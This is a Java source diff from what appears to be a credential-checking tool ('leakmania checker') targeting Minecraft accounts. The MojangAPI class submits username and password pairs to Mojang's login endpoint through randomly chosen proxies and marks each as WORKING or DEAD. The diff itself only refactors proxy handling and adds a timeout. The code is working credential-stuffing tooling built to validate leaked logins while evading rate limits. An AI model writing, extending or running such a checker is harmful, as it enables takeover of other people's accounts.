@@ -1,5 +1,6 @@
 package co.leakmania.checker.utils;
 
+import java.util.ArrayList;
 import java.util.Random;
 
 import co.leakmania.checker.enums.Protocol;
@@ -12,10 +13,11 @@ public class MojangAPI {
 	private String username;
 	private String password;
 	private String jsonTemplate = "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"%username%\",\"password\":\"%password%\",\"requestUser\":true}";
-	private String proxies[];
-	private WebClient wb = new WebClient(Protocol.HTTPS);
+	private ArrayList<String> proxies;
+	private WebClient wb;
 	
-	public MojangAPI(String proxies[]) {
+	public MojangAPI(ArrayList<String> proxies, int timeout) {
+		wb = new WebClient(Protocol.HTTPS, timeout);
 		if (proxies != null) this.proxies = proxies;
 		wb.setURL(host);
 	}
@@ -24,7 +26,7 @@ public class MojangAPI {
 		try {
 			if (proxies != null) wb.setProxy(getRandomProxy());
 			String reply;
-			reply = wb.httpPost(jsonTemplate.replace("%username%", username).replace("%password%", password), "application/json");
+			reply = wb.post(jsonTemplate.replace("%username%", username).replace("%password%", password), "application/json");
 			if (reply == null) return Replies.DEAD;
 			if (isValid(reply)) return Replies.WORKING;
 		} catch (Exception e) {
@@ -34,7 +36,7 @@ public class MojangAPI {
 	}
 	
 	private String getRandomProxy() {
-		return proxies[rdm.nextInt(proxies.length)];
+		return proxies.get(rdm.nextInt(proxies.size()));
 	}
 
 	public boolean isValid(String reply) {
